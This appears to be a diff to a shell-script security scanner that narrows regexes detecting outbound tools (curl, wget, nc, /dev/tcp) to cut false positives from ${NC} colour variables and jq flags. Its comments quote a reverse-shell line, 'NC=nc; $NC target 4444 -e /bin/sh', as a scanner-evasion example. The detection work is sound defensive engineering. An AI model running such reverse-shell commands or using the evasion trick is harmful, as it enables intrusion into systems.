@@ -3618,7 +3618,38 @@ _SH_CRED_FILE_RE = re.compile(
     re.I,
 )
 # Outbound commands that can send data off the machine.
-_SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|nc|ncat|netcat)\b|/dev/tcp/", re.I)
+# B-341 (SkillTrustBench fp_attribution, B13 39%-of-FPs bucket): the bare `nc` alternative
+# collided with two extremely common benign shapes that also satisfy `\bnc\b` under
+# re.I — (1) `${NC}`, the near-universal bash "No Color" ANSI-reset variable
+# (`NC='\033[0m'` alongside RED/GREEN/CYAN/BOLD/DIM is standard colored-output
+# boilerplate), and (2) a combined short-flag cluster on an unrelated command, e.g. `jq
+# -nc` (jq's `-n -c`).
+#
+# Round-1 fix ALSO excluded a bare `$NC` (no braces) via a `$`-in-the-lookbehind
+# exclusion. Independent C-135 review (round 2) found that unsound and gave a concrete
+# bypass: `alias`-free evasion routinely invokes a program through a variable —
+# `NC=nc; $NC target 4444 -e /bin/sh` — which is a completely ordinary technique, not a
+# corner case, and the `$`-exclusion made that invisible. The braced form `${NC}` is
+# UNAMBIGUOUS — brace-delimited parameter expansion can only ever be a variable
+# reference, never a command position — but a bare `$NC` is genuinely ambiguous (color
+# echo OR program-alias invocation) with no sound regex-level way to tell them apart, so
+# per this project's bias (a residual FP beats a false negative), it is deliberately
+# LEFT MATCHING: only the `{`-immediately-before shape is excluded now, not `$` alone.
+# The `-` exclusion (a flag cluster on an unrelated command, e.g. `-nc`) is untouched —
+# it wasn't part of the C-135 finding and a real `nc` invocation is never spelled as a
+# bare word directly glued onto a preceding hyphen. The trailing `(?!\s*=)` still
+# excludes only a literal ASSIGNMENT (`NC='\033[0m'`), never an invocation.
+#
+# Residual (documented, not solved by more lookbehind cleverness — C-135 round 2's own
+# conclusion): every SkillTrustBench false-condemnation case in this bucket happened to
+# use ONLY the braced `${NC}` form for the actual FP-causing line, so this narrower
+# exclusion still clears all of them (verified: tests/test_shell_scan.py); a hypothetical
+# benign script that only ever writes bare `$NC` (no braces) for its color-reset variable
+# would still trip this pattern — accepted, since the alternative is the real evasion gap
+# above.
+_SH_OUTBOUND_RE = re.compile(
+    r"\b(?:curl|wget|ncat|netcat)\b|(?<![{-])\bnc\b(?!\s*=)|/dev/tcp/", re.I
+)
 # curl|wget URL piped into a NON-shell interpreter (download -> exec) — extends the
 # sh/bash-only _PIPE_SHELL_RE (the checks engine) to python/node/perl/ruby/php/deno.
 _SH_PIPE_INTERP_RE = re.compile(
@@ -3656,7 +3687,9 @@ _SH_EVAL_REMOTE_RE = re.compile(
 )
 # raw-socket outbound (nc//dev/tcp) — deliberately EXCLUDES curl/wget, which legitimately
 # carry an auth header to an API. Sending a secret over a raw socket is not legitimate.
-_SH_RAW_SOCKET_RE = re.compile(r"\b(?:nc|ncat|netcat)\b|/dev/tcp/", re.I)
+# B-341: same bare-`nc` collision/exclusion as _SH_OUTBOUND_RE above (see its comment,
+# including the round-2 C-135 finding on why only `{` — not bare `$` — is excluded).
+_SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|(?<![{-])\bnc\b(?!\s*=)|/dev/tcp/", re.I)
 # a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/…). Gating env->outbound
 # on the name (not any $VAR) is what keeps this zero-FP against authed-API scripts.
 _SH_CRED_ENV_RE = re.compile(
@@ -3665,6 +3698,29 @@ _SH_CRED_ENV_RE = re.compile(
     r"[A-Za-z0-9_]*\}?",
     re.I,
 )
+
+
+# B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
+# unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
+# '{...,password:$password}'` matching SHELL_ENV_EXFIL — but the actual trigger turned
+# out to be `_SH_RAW_SOCKET_RE` matching "nc" inside jq's own `-nc` (`-n -c`) combined
+# short-flag cluster, NOT a real credential-var/raw-socket pairing. Once
+# `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE` were narrowed (above) to stop matching a bare
+# `nc` immediately preceded by `-` (a flag cluster on some OTHER command) or `{` (a
+# `${NC}` variable reference), `_SH_RAW_SOCKET_RE` no longer matches that line at all —
+# this SHELL_ENV_EXFIL check is never even reached for it, so both corpus cases are
+# already resolved. VERIFIED empirically against the real fixture content, not assumed.
+#
+# Four independent rounds (C-135) were spent trying to ALSO add quote/jq-template
+# awareness directly to this check specifically, on the (incorrect) assumption that the
+# credential-var-in-jq-template shape itself needed excluding here. Each attempt (a
+# same-line parity count, a blob-wide bash quote-state machine, a narrow jq-`'{...}'`
+# regex, a proper bash lexer) was retracted after breaking some other real case — full
+# history preserved in `checks._vet._redirect_targets_file`'s docstring, whose sibling
+# fix (the comment-line redirect exclusion) DOES have a genuine remaining residual.
+# Nothing from those four rounds landed here: the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
+# narrowing above was sufficient on its own, and this check is otherwise pre-B-341
+# behavior, unchanged.
 
 
 # B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
